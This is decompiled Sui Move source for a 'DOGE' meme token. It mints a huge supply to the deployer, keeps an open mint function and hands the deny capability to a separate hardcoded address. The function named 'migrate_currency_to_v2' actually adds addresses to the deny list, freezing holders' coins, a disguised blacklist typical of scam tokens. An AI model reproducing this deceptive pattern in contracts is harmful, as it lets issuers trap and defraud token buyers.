module 0x3effbab8679f4acc4b2efd91e7bb8822f0f32637e3aad4b25ca845c7b90a91f1::doge {
    struct DOGE has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<DOGE>, arg1: 0x2::coin::Coin<DOGE>) {
        0x2::coin::burn<DOGE>(arg0, arg1);
    }

    fun init(arg0: DOGE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOGE>(arg0, 9, b"DOGE", b"Department of Gov Efficiency", b"The Department of Government Efficiency, proposed by Donald Trump, would be led by Elon Musk to audit federal spending, reduce waste, and propose reforms to enhance government performance, reflecting their recent political alliance.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/qFGJmCS/doge.webp")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DOGE>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGE>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<DOGE>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGE>>(v1, @0x51109d190acb168019f395739ceb188ac699f7acba84b80980ae1413c3837fc0);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGE>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<DOGE>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<DOGE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

